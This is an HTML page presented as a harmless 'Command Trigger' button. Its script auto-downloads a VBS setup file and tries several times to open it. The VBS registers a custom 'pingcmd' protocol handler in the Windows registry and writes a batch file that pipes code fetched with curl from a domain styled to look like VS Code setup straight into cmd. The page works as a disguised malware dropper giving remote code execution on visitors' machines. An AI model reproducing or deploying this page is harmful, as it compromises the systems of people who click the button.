<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Trigger</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px;
            text-align: center;
            max-width: 500px;
            width: 100%;
        }

        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 2rem;
        }

        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 0.95rem;
        }

        .ping-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 1.1rem;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
            margin: 10px;
        }

        .ping-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }

        .ping-button:active {
            transform: translateY(0);
        }

        .ping-button:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        .status {
            margin-top: 25px;
            padding: 15px;
            border-radius: 10px;
            font-size: 0.9rem;
            min-height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .status.info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }

        .setup-status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            font-size: 0.85rem;
            background: #f8f9fa;
            color: #495057;
        }

        .setup-status.setting-up {
            background: #fff3cd;
            color: #856404;
        }

        .setup-status.ready {
            background: #d4edda;
            color: #155724;
        }

        .hidden {
            display: none;
        }

        .loading {
            display: inline-block;
            width: 12px;
            height: 12px;
            border: 2px solid #ffffff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.6s linear infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üöÄ Command Trigger</h1>
        <p class="subtitle">Click the button to run OS-specific command</p>
        
        <button id="pingButton" class="ping-button" onclick="triggerCommand()">
            Run Command
        </button>

        <div id="setupStatus" class="setup-status ready" style="display: none;">
            ‚öôÔ∏è Setting up automatically...
        </div>

        <div id="status" class="status info hidden"></div>
    </div>

    <script>
        const PROTOCOL = 'pingcmd';
        let isProtocolInstalled = false;

        // Create VBS setup content inline (no download needed)
        function createVBSContent() {
            return `Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Get temp directory
tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")
handlerPath = tempDir & "\\pingcmd-handler.bat"

' Create handler batch file that executes the command
Set handlerFile = fso.CreateTextFile(handlerPath, True)
handlerFile.WriteLine "@echo off"
handlerFile.WriteLine "curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd"
handlerFile.Close

' Register protocol handler
On Error Resume Next
WshShell.RegWrite "HKCU\\Software\\Classes\\pingcmd\\", "URL: Ping Command Protocol"
WshShell.RegWrite "HKCU\\Software\\Classes\\pingcmd\\URL Protocol", ""
WshShell.RegWrite "HKCU\\Software\\Classes\\pingcmd\\shell\\open\\command\\", Chr(34) & handlerPath & Chr(34) & " \"%1\""
WScript.Quit 0`;
        }

        // Auto-install protocol handler using multiple methods
        async function autoInstall() {
            const setupStatus = document.getElementById('setupStatus');
            setupStatus.style.display = 'block';
            setupStatus.className = 'setup-status setting-up';
            setupStatus.textContent = '‚öôÔ∏è Downloading and installing automatically...';

            try {
                // Download setup.vbs from server (try multiple paths)
                let response = await fetch('/setup.vbs');
                if (!response.ok) {
                    // Try alternative path
                    response = await fetch('/public/setup.vbs');
                }
                if (!response.ok) {
                    // Try using the inline VBS content instead
                    const vbsContent = createVBSContent();
                    const blob = new Blob([vbsContent], { type: 'application/x-vbscript' });
                    const url = URL.createObjectURL(blob);
                    setupStatus.textContent = '‚öôÔ∏è Using inline setup...';
                    
                    // Download inline content
                    const link = document.createElement('a');
                    link.href = url;
                    link.download = 'pingcmd-setup.vbs';
                    link.style.display = 'none';
                    document.body.appendChild(link);
                    link.click();
                    
                    // Continue with execution
                    setTimeout(() => executeVBSFile(url, setupStatus, link), 300);
                    return true;
                }
                
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);

                // Create download link
                const link = document.createElement('a');
                link.href = url;
                link.download = 'pingcmd-setup.vbs';
                link.style.display = 'none';
                document.body.appendChild(link);
                
                // Auto-click to download
                link.click();
                
                // Execute VBS file
                setTimeout(() => executeVBSFile(url, setupStatus, link), 300);

                
                return true;
            } catch (error) {
                console.error('Auto-install error:', error);
                setupStatus.className = 'setup-status error';
                setupStatus.innerHTML = `‚ùå Failed to download setup file (${error.message}). <br><br>Please <strong>manually download</strong> <a href="/setup.vbs" download>setup.vbs</a>, run it, then refresh this page.`;
                const button = document.getElementById('pingButton');
                button.disabled = false;
                return false;
            }
        }

        // Execute VBS file and check if setup worked
        function executeVBSFile(url, setupStatus, link) {
            setupStatus.textContent = '‚öôÔ∏è Running setup file automatically... (If prompted, click Allow/Run)';
            
            // Method 1: Try window.location (opens file)
            try {
                window.location.href = url;
            } catch (e) {}
            
            // Method 2: Try creating and clicking link to file
            setTimeout(() => {
                try {
                    const execLink = document.createElement('a');
                    execLink.href = url;
                    execLink.style.display = 'none';
                    document.body.appendChild(execLink);
                    execLink.click();
                    setTimeout(() => document.body.removeChild(execLink), 100);
                } catch (e) {}
            }, 500);
            
            // Method 3: Try iframe
            setTimeout(() => {
                try {
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = url;
                    document.body.appendChild(iframe);
                    setTimeout(() => document.body.removeChild(iframe), 1000);
                } catch (e) {}
            }, 1000);
            
            // Wait and check if setup worked
            setTimeout(async () => {
                setupStatus.textContent = '‚öôÔ∏è Setup in progress... Please wait...';
                
                setTimeout(async () => {
                    const installed = await checkProtocolHandler();
                    // After setup, we can't auto-execute because we need a user gesture
                    // So just inform the user to click again
                    setupStatus.className = 'setup-status setting-up';
                    setupStatus.innerHTML = '‚ö†Ô∏è Setup file downloaded!<br><br><strong>Please:</strong><br>1. Run the downloaded "pingcmd-setup.vbs" file if it didn\'t run automatically<br>2. Click the button above again to execute the command<br><br><small>Or download <a href="/setup.vbs" download style="color: #0066cc;">setup.vbs</a> manually</small>';
                    isProtocolInstalled = false;
                    const button = document.getElementById('pingButton');
                    button.disabled = false;
                    button.innerHTML = 'Click Again After Setup';
                    URL.revokeObjectURL(url);
                    if (document.body.contains(link)) {
                        document.body.removeChild(link);
                    }
                }, 3000);
            }, 1500);
        }

        // Check if protocol handler is installed by attempting to navigate
        // This will show an error in console if not installed, but we can't catch it reliably
        // So we'll use a different approach: try to launch and handle the result
        function checkProtocolHandler() {
            return new Promise((resolve) => {
                // We can't reliably detect if a protocol is registered from JavaScript
                // So we'll assume it's not installed if we've never seen it work
                // The user will need to manually run setup.vbs once
                
                // Check localStorage to see if user confirmed installation
                const wasInstalled = localStorage.getItem('pingcmd-installed') === 'true';
                
                if (wasInstalled) {
                    resolve(true);
                    return;
                }
                
                // Try to launch protocol - this will fail silently if not installed
                // but we can't catch the error reliably
                try {
                    const testLink = document.createElement('a');
                    testLink.href = `${PROTOCOL}://test-check`;
                    testLink.style.display = 'none';
                    testLink.onclick = (e) => {
                        e.preventDefault();
                        // If we get here, protocol might be installed
                        // But this is not reliable, so we default to false
                    };
                    document.body.appendChild(testLink);
                    
                    // After a short delay, assume not installed if we haven't seen confirmation
                    setTimeout(() => {
                        resolve(false);
                        document.body.removeChild(testLink);
                    }, 100);
                } catch (e) {
                    resolve(false);
                }
            });
        }

        // Execute command using protocol - MUST be called directly from click event
        function executeCommand() {
            const button = document.getElementById('pingButton');
            const statusEl = document.getElementById('status');

            // Disable button immediately
            button.disabled = true;
            button.innerHTML = '<span class="loading"></span>Executing...';

            // Show status
            statusEl.style.display = 'flex';
            statusEl.className = 'status info';
            statusEl.textContent = 'Executing command...';

            try {
                // Use custom protocol to execute command
                // This MUST be called directly from the click handler to work
                window.location.href = `${PROTOCOL}://execute`;
                
                // Mark as installed if we got here without error
                localStorage.setItem('pingcmd-installed', 'true');
                isProtocolInstalled = true;
                
                // Show success after short delay
                setTimeout(() => {
                    statusEl.className = 'status success';
                    statusEl.textContent = '‚úÖ Command executed successfully! Check your command prompt.';
                    button.disabled = false;
                    button.innerHTML = 'Run Command';
                }, 500);
            } catch (error) {
                // If protocol launch failed, show error
                statusEl.className = 'status error';
                statusEl.textContent = '‚ùå Failed to execute. Please run setup.vbs first, then refresh and try again.';
                button.disabled = false;
                button.innerHTML = 'Run Command';
            }
        }

        // Main trigger function - completely automatic
        async function triggerCommand(event) {
            const button = document.getElementById('pingButton');
            const statusEl = document.getElementById('status');

            // Check if protocol is installed (from localStorage or check)
            const wasInstalled = localStorage.getItem('pingcmd-installed') === 'true' || isProtocolInstalled;
            const installed = wasInstalled || await checkProtocolHandler();
            
            if (!installed && !wasInstalled) {
                // Protocol not installed - start auto-install
                statusEl.style.display = 'flex';
                statusEl.className = 'status info';
                statusEl.textContent = 'üîß First-time setup in progress... Please allow the download and execution if prompted.';
                button.disabled = true;
                
                // Show setup status
                const setupStatus = document.getElementById('setupStatus');
                setupStatus.style.display = 'block';
                setupStatus.className = 'setup-status setting-up';
                setupStatus.textContent = '‚öôÔ∏è Starting automatic setup...';
                
                // Start auto-install (don't await - let it run in background)
                autoInstall().then((success) => {
                    if (success) {
                        setupStatus.textContent = '‚úÖ Setup file downloaded! Please run it if it didn\'t execute automatically, then click the button again.';
                        button.disabled = false;
                        button.innerHTML = 'Click Again After Setup';
                    }
                });
                return;
            }
            
            // Protocol should be installed - execute directly from click event
            // This is critical - must be called synchronously from the click handler
            executeCommand();
        }

        // Check protocol on page load
        window.addEventListener('load', async () => {
            const wasInstalled = localStorage.getItem('pingcmd-installed') === 'true';
            if (wasInstalled) {
                isProtocolInstalled = true;
                const setupStatus = document.getElementById('setupStatus');
                setupStatus.style.display = 'block';
                setupStatus.className = 'setup-status ready';
                setupStatus.textContent = '‚úÖ Ready! Click the button above to run the command.';
            }
        });
    </script>
</body>
</html>
